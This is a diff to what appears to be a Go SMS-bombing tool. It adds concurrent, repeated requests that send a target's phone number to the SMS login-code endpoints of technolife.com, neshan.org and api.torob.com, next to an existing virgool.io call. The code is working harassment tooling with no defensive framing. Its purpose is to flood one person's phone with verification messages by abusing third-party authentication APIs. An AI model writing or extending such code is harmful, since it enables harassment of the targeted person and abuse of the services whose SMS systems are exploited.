@@ -168,6 +168,28 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 
+		// technolife.com (JSON) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://www.technolife.com/_next/data/_Xnjxy3mtSBVgJVep3pDD/account/LoginWithMobileCode.json?backTo=%%2F&backToAction=&mobileNo=%v&request_id=60660888", phone), map[string]interface{}{
+			"mobileNo": phone,
+		}, &wg, ch)
+		// technolife.com (JSON) - Duplicate, keeping as provided
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://www.technolife.com/_next/data/_Xnjxy3mtSBVgJVep3pDD/account/LoginWithMobileCode.json?backTo=%%2F&backToAction=&mobileNo=%v&request_id=60660888", phone), map[string]interface{}{
+			"mobileNo": phone,
+		}, &wg, ch)
+
+		// neshan.org (JSON) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=%v&uuid=web_8b344e60-309a-4de5-8871-824285706c7b2e758260-a41b-11ef-b59f-753c5ec5fe23c04f4a6e-9670-45f4-ad1d-1503748d75bb", phone), map[string]interface{}{
+			"mobileNumber": phone,
+		}, &wg, ch)
+
+		// api.torob.com (JSON) - send-pin (Duplicate URL, keeping as provided) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://api.torob.com/v4/user/phone/send-pin/?phone_number=%v&source=next_desktop", phone), map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
                 // virgool.io (JSON) - identifier
 		wg.Add(1)
 		go sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
